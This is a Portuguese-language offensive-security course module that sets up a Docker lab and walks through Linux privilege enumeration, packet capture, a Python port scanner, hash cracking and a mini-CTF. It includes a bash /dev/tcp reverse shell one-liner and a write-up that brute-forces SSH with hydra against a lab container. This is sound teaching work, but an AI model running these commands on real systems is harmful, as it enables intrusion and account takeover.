# 🧱 MÓDULO 0 — Revisão Prática dos Fundamentos

> **Pré-req:** os listados na introdução

## 🎯 Objetivos de Aprendizado

Ao final deste módulo você será capaz de:

1. Subir e destruir o ambiente "Lab Hub" do curso com um único comando.
2. Operar fluentemente um shell Linux ofensivo (Kali rodando em contêiner).
3. Diagnosticar e manipular tráfego de rede a partir de captura `pcap`.
4. Escrever scripts Bash e Python úteis para automação ofensiva.
5. Identificar e quebrar criptografia fraca em CTFs simples.

## 📖 Teoria Mínima — Por Que Docker Para Hacking?

Antes de Docker, montar lab de pentest era doloroso: VMs gigantes (Kali, Metasploitable, AD…), snapshots, redes virtuais complicadas. Docker resolve isso porque:

- **Isolamento leve:** cada serviço vulnerável vira um contêiner, sem overhead de OS guest.
- **Reprodutibilidade:** o mesmo `docker-compose.yml` roda igual no seu Mac, no Linux do colega e no servidor.
- **Reset rápido:** quebrou? `docker compose down -v && docker compose up -d` e voltou ao zero.
- **Rede virtual nativa:** redes bridge customizadas simulam segmentação real (DMZ, internal, etc.).

A única limitação relevante é que Docker compartilha o kernel do host. Para certos labs (kernel exploits, rootkits, drivers) usaremos **VMs dentro do contêiner via QEMU**, o que veremos nos módulos 6 e 7.

---

## 🐳 0.1 — Lab Setup Global do Curso

Vamos criar a estrutura de pastas e o Lab Hub que você usará durante todo o curso.

### Estrutura de pastas recomendada

```
~/hacking-masterclass/
├── module-0-fundamentals/
├── module-1-network/
├── module-2-web/
├── ...
├── module-10-ai/
├── capstone/
└── shared/
    ├── wordlists/        # rockyou, SecLists, etc.
    ├── tools/            # binários custom
    └── notes/            # seus write-ups
```

Crie com:

```bash
mkdir -p ~/hacking-masterclass/{module-{0..10},capstone,shared/{wordlists,tools,notes}}
cd ~/hacking-masterclass
```

### Lab Hub: o "Kali Box" do curso

Em vez de instalar 200 ferramentas no host, você vai sempre atacar a partir de um contêiner Kali pré-configurado. O arquivo de composição já está pronto no repositório:

📄 **[docker-compose.yml](docker-compose.yml)**

O Dockerfile do alvo SSH (para revisão de Bash + scanning) também já está no repositório:

📄 **[victim-ssh/Dockerfile](victim-ssh/Dockerfile)**

### Comandos para subir e operar

```bash
cd ~/hacking-masterclass/module-0-fundamentals
mkdir -p workspace victim-ssh
# (cole o Dockerfile dentro de victim-ssh/)

docker compose up -d --build

# Entrar no Kali atacante:
docker exec -it attacker bash

# Verificar conectividade no lab:
docker exec attacker ping -c 2 172.30.0.20
docker exec attacker ping -c 2 172.30.0.30

# Derrubar tudo (e apagar volumes):
docker compose down -v
```

> 💡 **Tip:** crie um alias permanente no seu `.bashrc`/`.zshrc`:
> `alias kali='docker exec -it attacker bash'`

---

## 🐧 0.2 — Linux Ofensivo em 30 Minutos

Não vamos cobrir o que é `ls`. Foco em **truques que pentester sênior usa diariamente**.

### Exercício 0.2.1 — Enumeração de privilégios

Dentro do contêiner `victim-ssh`, descubra o que pode rodar como root:

```bash
docker exec -it victim-ssh bash
# Como usuário comum (após login SSH):
sudo -l                          # binários sudo permitidos
find / -perm -u=s -type f 2>/dev/null   # SUID
find / -writable -type d 2>/dev/null | grep -v proc   # dirs graváveis
getcap -r / 2>/dev/null          # capabilities
cat /etc/crontab; ls -la /etc/cron.*    # cron jobs
```

### Exercício 0.2.2 — File descriptors e processos

```bash
ls -la /proc/$$/fd               # FDs do shell atual
lsof -i -P -n | grep LISTEN      # quem escuta em quais portas
ss -tulnp                        # idem, mais moderno
ps -eo pid,ppid,user,cmd --forest  # árvore de processos
```

### Exercício 0.2.3 — Pipes não-óbvias para ofensiva

```bash
# Reverse shell em uma linha (testar de attacker -> victim):
# Atacante:
nc -lvnp 4444
# Vítima:
bash -i >& /dev/tcp/172.30.0.10/4444 0>&1

# Upgrade de TTY (clássico, decora!):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Depois:
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

> 🎓 **Por que isso importa:** 80% das vezes que você ganha shell em pentest, ela é "burra" (sem tab-completion, Ctrl+C mata a sessão). Esse upgrade vira segunda natureza.

---

## 🌐 0.3 — Redes na Prática

### Exercício 0.3.1 — Captura e análise de pacotes

A partir do `attacker`, capture tráfego enquanto você usa `curl`:

```bash
# Terminal 1 (dentro do attacker):
tcpdump -i eth0 -w /shared/notes/capture.pcap host 172.30.0.20 &

# Terminal 2 (dentro do attacker):
curl -sv http://172.30.0.20/ -H "User-Agent: HackingMasterclass" > /dev/null

# Mata o tcpdump (Ctrl+C ou kill %1) e analisa:
tshark -r /shared/notes/capture.pcap -Y "http" -T fields -e http.request.method -e http.host -e http.user_agent
```

### Exercício 0.3.2 — DNS na unha

```bash
dig @1.1.1.1 google.com +short
dig @1.1.1.1 google.com MX
dig @1.1.1.1 google.com TXT
dig @1.1.1.1 -x 8.8.8.8                # reverse
host -t any anthropic.com               # qualquer registro
```

### Exercício 0.3.3 — TLS sem mistério

```bash
echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
```

Você acabou de extrair: subject, issuer, validade e SANs do certificado — tudo fundamental em recon.

---

## 🐍 0.4 — Bash + Python para Ofensiva

### Exercício 0.4.1 — Gerar wordlist customizada com Bash

Imagine que você descobriu via OSINT o nome da empresa "Acme Corp" e o CEO "João Silva". Gere uma wordlist provável:

```bash
cat > /shared/notes/cupp_lite.sh <<'EOF'
#!/bin/bash
NAMES=("acme" "joao" "silva" "joaosilva" "joao.silva")
SUFFIXES=("" "123" "2024" "2025" "@" "!" "#")
YEARS=("" "2024" "2025")
for n in "${NAMES[@]}"; do
  for s in "${SUFFIXES[@]}"; do
    for y in "${YEARS[@]}"; do
      echo "${n}${s}${y}"
      echo "${n^}${s}${y}"   # capitalize
    done
  done
done | sort -u
EOF
chmod +x /shared/notes/cupp_lite.sh
/shared/notes/cupp_lite.sh > /shared/notes/wordlist_acme.txt
wc -l /shared/notes/wordlist_acme.txt
```

### Exercício 0.4.2 — Port scanner concorrente em Python

```python
# /shared/notes/miniscan.py
import socket
from concurrent.futures import ThreadPoolExecutor
import sys

def scan(host, port, timeout=0.5):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            return port
        except:
            return None

if __name__ == "__main__":
    target = sys.argv[1]
    ports = range(1, 1025)
    with ThreadPoolExecutor(max_workers=200) as ex:
        for result in ex.map(lambda p: scan(target, p), ports):
            if result:
                print(f"[+] {target}:{result} OPEN")
```

Rode dentro do `attacker`:

```bash
python3 /shared/notes/miniscan.py 172.30.0.30
```

Saída esperada: `[+] 172.30.0.30:22 OPEN`.

> 🎯 **Exercício extra:** evolua o script para detectar banner do serviço (recv 1024 bytes) e salvar JSON.

---

## 🔐 0.5 — Criptografia Aplicada

### Exercício 0.5.1 — Identificar e quebrar hashes

```bash
# Dentro do attacker:
echo -n "Senha123" | md5sum
echo -n "Senha123" | sha1sum
echo -n "Senha123" | sha256sum

# Identificação automática:
hashid '5ebe2294ecd0e0f08eab7690d2a6ee69'

# Quebra com John (usando wordlist do curso):
echo '5ebe2294ecd0e0f08eab7690d2a6ee69' > /tmp/h.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/h.txt
# Se rockyou não vier descompactado:
gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
```

### Exercício 0.5.2 — Cifra simétrica AES com OpenSSL

```bash
# Cifrar:
echo "segredo importante" | openssl enc -aes-256-cbc -pbkdf2 -salt -out /tmp/msg.enc
# Decifrar:
openssl enc -d -aes-256-cbc -pbkdf2 -in /tmp/msg.enc
```

### Exercício 0.5.3 — RSA na unha

```bash
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
echo "mensagem" | openssl pkeyutl -encrypt -pubin -inkey pub.pem | base64
echo "<base64-aqui>" | base64 -d | openssl pkeyutl -decrypt -inkey priv.pem
```

---

## 🚩 0.6 — Mini-CTF de Aquecimento

> **Cenário:** Você conseguiu acesso à rede `172.30.0.0/24`. Há um servidor SSH em algum host. Sua missão: ganhar acesso e capturar a flag em `/home/alice/.flag`.

**Regras:**
- Use apenas o contêiner `attacker`.
- Você tem a wordlist `/usr/share/wordlists/rockyou.txt`.
- Tempo sugerido: 45 minutos.

**Flag esperada:** `flag{...}`

---

<details>
<summary>🔓 <b>Write-up — só abra depois de tentar!</b></summary>

### Passo 1 — Descobrir hosts vivos

```bash
nmap -sn 172.30.0.0/24
```

Você verá os hosts `.10` (você), `.20` (DVWA) e `.30` (alvo SSH).

### Passo 2 — Descobrir serviços

```bash
nmap -sV -p- --min-rate 5000 172.30.0.30
```

Saída esperada: porta 22 com OpenSSH.

### Passo 3 — Enumerar usuários (OSINT do enunciado: "alice")

Como sabemos que a flag está em `/home/alice/.flag`, alice é nosso alvo.

### Passo 4 — Brute force focado

```bash
hydra -l alice -P /usr/share/wordlists/rockyou.txt ssh://172.30.0.30 -t 4 -f
```

A senha `summer2025` está no rockyou. Hydra retorna `[22][ssh] host: 172.30.0.30 login: alice password: summer2025`.

### Passo 5 — Conectar e capturar

```bash
ssh alice@172.30.0.30
# senha: summer2025
cat ~/.flag
# flag{m0dulo_zer0_ssh_brute_was_easy}
```

### Lição

- Brute force ainda funciona contra senhas fracas — humanos são o elo fraco.
- `hydra -t 4` mantém a paralelização baixa para não derrubar serviço (em pentest real, sempre confirme com cliente antes).
- O parâmetro `-f` para na primeira credencial válida — economiza tempo.

</details>

---

## 🧰 Toolbox do Módulo 0

| Ferramenta | Versão testada | Uso |
|---|---|---|
| Docker Engine | 24.0+ | Runtime de contêineres |
| Docker Compose | v2.20+ | Orquestração |
| Kali (kalilinux/kali-rolling) | 2026.1 | Distro ofensiva |
| Nmap | 7.94 | Scanning |
| Hydra | 9.5 | Brute force de protocolos |
| John the Ripper | 1.9.0-jumbo-1 | Cracking de hashes |
| tcpdump / tshark | 4.99+ | Captura de pacotes |
| OpenSSL | 3.0+ | Crypto + TLS |
| Python | 3.11+ | Scripting |

---

## 🐛 Troubleshooting

| Sintoma | Causa provável | Correção |
|---|---|---|
| `docker compose up` falha com "permission denied" no socket | Seu user não está no grupo `docker` | `sudo usermod -aG docker $USER && newgrp docker` |
| `apt update` lento dentro do Kali | Mirror padrão lento | Edite `/etc/apt/sources.list` para `http.kali.org` ou mirror BR |
| `tcpdump`: "no permissions" | Capacidades faltando | Verifique `cap_add: [NET_ADMIN, NET_RAW]` no compose |
| Ping não funciona dentro do attacker | ICMP bloqueado por firewall do Docker | Confirme `cap_add` e `network: lab-net` |
| `hydra` reclama de "too many auth failures" | SSH com `MaxAuthTries` baixo | Reduza `-t` para 2 ou use `--threads 1` |

---

## 📚 Recursos Extras

- **Livro:** *The Linux Command Line* — William Shotts (gratuito em linuxcommand.org)
- **Plataforma:** [OverTheWire — Bandit](https://overthewire.org/wargames/bandit/) (excelente para revisar Linux ofensivo)
- **Vídeo:** *IppSec — HackTheBox walkthroughs* (canal no YouTube — ouro puro)
- **Paper:** [MITRE ATT&CK Matrix for Enterprise](https://attack.mitre.org/matrices/enterprise/)
- **Cheatsheet:** [PayloadsAllTheThings (GitHub)](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## ✅ Checklist do Módulo 0

- [ ] Subiu o `docker-compose.yml` do Lab Hub com sucesso
- [ ] Conseguiu shell no `attacker` e pingou os outros contêineres
- [ ] Capturou e leu um pcap com tshark
- [ ] Rodou o `miniscan.py` e obteve resposta
- [ ] Quebrou um hash MD5 com John
- [ ] Capturou a flag do mini-CTF
- [ ] Anotou tudo no `/shared/notes/modulo-0.md`

Quando todos os itens estiverem marcados, você está pronto para o **Módulo 1 — Network Hacking & Pivoting**.

---